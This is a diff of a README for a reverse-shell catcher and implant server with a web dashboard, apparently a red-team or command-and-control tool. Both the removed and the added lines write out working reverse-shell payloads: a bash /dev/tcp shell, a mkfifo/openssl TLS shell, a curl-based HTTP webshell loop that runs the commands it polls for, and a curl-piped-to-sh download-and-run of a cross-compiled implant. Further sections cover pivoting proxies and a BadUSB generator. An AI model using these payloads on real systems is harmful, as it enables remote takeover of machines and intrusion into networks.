@@ -15,7 +15,8 @@ A single-host, multi-transport reverse-shell catcher with a browser dashboard.
 
 | | |
 |---|---|
-| 🌐 **Multi-transport** | Raw TCP · TLS · HTTP webshell · multiplexed WebSocket/protobuf Go client |
+| 🌐 **Transports** | Raw TCP · TLS · HTTP webshell |
+| 🔗 **Mux client** | Persistent WebSocket/protobuf implant: real PTY, file manager, proxy, auto-reconnect |
 | 🖥️ **Dashboard** | Live sessions, full PTY terminal with resize + mouse support |
 | 📁 **File tools** | Per-host file transfer, native file-system browser, streaming upload/download |
 | 🌐 **HTTP CONNECT proxy** | Per-mux-host proxy with Basic auth (great for pivoting) |
@@ -58,40 +59,14 @@ auto-generates a self-signed cert on first start using the bundled `openssl`.
 
 ## 💥 Reverse-shell payloads
 
-### Raw TCP
+### 🚀 Mux client (recommended)
 
-```bash
-bash -i >& /dev/tcp/YOUR_HOST/1337 0>&1
-```
+The Go mux client is the richest transport: a persistent WebSocket connection
+that reports hostname, user, OS, and arch, and spawns a real PTY for each shell
+channel. Resize events from xterm are forwarded to the remote PTY via
+`SIGWINCH`; on disconnect it reconnects with linear backoff.
 
-### TLS
-
-```bash
-mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | \
-  openssl s_client -quiet -connect YOUR_HOST:1338 >/tmp/f
-```
-
-The listener logs the certificate fingerprint on startup so the target can pin
-it if desired.
-
-### HTTP webshell
-
-For firewalled targets that can only make outbound HTTP requests. The webshell
-endpoints require the same `BUILD_TOKEN` used by `/mux` and `/dl`:
-
-```bash
-H=http://YOUR_HOST:8080; T=YOUR_BUILD_TOKEN
-ID=$(curl -s "$H/webshell/register?token=$T")
-while :; do
-  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")
-  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)
-  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"
-done
-```
-
-### Multiplexed Go client (mux)
-
-Build and run the included Go client:
+Build and run the included client:
 
 ```bash
 cd client
@@ -105,10 +80,31 @@ Or use the `RSL_SERVER` env var:
 RSL_SERVER=ws://YOUR_HOST:8080/mux ./rsl-client
 ```
 
-The Go client opens a persistent WebSocket, reports hostname/user/OS/arch, and
-spawns a real PTY for each channel the operator requests from the dashboard.
-Resize events from xterm are forwarded to the remote PTY via `SIGWINCH`. On
-disconnect it reconnects with linear backoff.
+### Download and run
+
+`/dl?token=...&os=...&arch=...` cross-compiles and returns the Go client binary.
+`/dl/s?token=...&os=...` returns a tiny one-liner script that curls `/dl` and
+runs the binary, useful when the target can type only a short command:
+
+```bash
+# Linux/macOS target
+curl -sL 'https://rsl.example.com/dl/s?token=YOUR_BUILD_TOKEN&os=linux' | sh
+```
+
+### Build from the dashboard
+
+The dashboard's **Build client** panel (sidebar, bottom) cross-compiles the
+Go client on the server and downloads the binary with the server URL and tags
+baked in via `-ldflags -X`, so the downloaded client just runs with no args:
+
+```bash
+./rsl-client            # uses the baked-in server URL + tags
+RSL_SERVER=ws://other:8080/mux ./rsl-client   # override at runtime
+```
+
+Available targets: `linux-amd64`, `linux-arm64`, `linux-arm-7`,
+`linux-mips-softfloat`, `linux-mipsle-softfloat`, `linux-386`,
+`darwin-arm64`, `darwin-amd64`, `windows-amd64`, `windows-arm64`.
 
 ### HTTP CONNECT proxy
 
@@ -125,30 +121,35 @@ curl -x http://rsl.example.com:3128 -U h1:YOUR_PROXY_TOKEN https://example.com
   expose through reverse proxies like Traefik that cannot forward raw `CONNECT`
   tunnels on an HTTP route.
 
-### Building the client from the dashboard
-
-The dashboard's **Build client** panel (sidebar, bottom) cross-compiles the
-Go client on the server and downloads the binary with the server URL and tags
-baked in via `-ldflags -X`, so the downloaded client just runs with no args:
+### Raw TCP fallback
 
 ```bash
-./rsl-client            # uses the baked-in server URL + tags
-RSL_SERVER=ws://other:8080/mux ./rsl-client   # override at runtime
+bash -i >& /dev/tcp/YOUR_HOST/1337 0>&1
 ```
 
-Available targets: `linux-amd64`, `linux-arm64`, `linux-arm-7`,
-`linux-mips-softfloat`, `linux-mipsle-softfloat`, `linux-386`,
-`darwin-arm64`, `darwin-amd64`, `windows-amd64`, `windows-arm64`.
-
-### Download endpoints
-
-`/dl?token=...&os=...&arch=...` cross-compiles and returns the Go client binary.
-`/dl/s?token=...&os=...` returns a tiny one-liner script that curls `/dl` and
-runs the binary, useful when the target can type only a short command:
+### TLS fallback
 
 ```bash
-# Linux/macOS target
-curl -sL 'https://rsl.example.com/dl/s?token=YOUR_BUILD_TOKEN&os=linux' | sh
+mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | \
+  openssl s_client -quiet -connect YOUR_HOST:1338 >/tmp/f
+```
+
+The listener logs the certificate fingerprint on startup so the target can pin
+it if desired.
+
+### HTTP webshell fallback
+
+For firewalled targets that can only make outbound HTTP requests. The webshell
+endpoints require the same `BUILD_TOKEN` used by `/mux` and `/dl`:
+
+```bash
+H=http://YOUR_HOST:8080; T=YOUR_BUILD_TOKEN
+ID=$(curl -s "$H/webshell/register?token=$T")
+while :; do
+  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")
+  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)
+  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"
+done
 ```
 
 ### BadUSB / DuckyScript generator
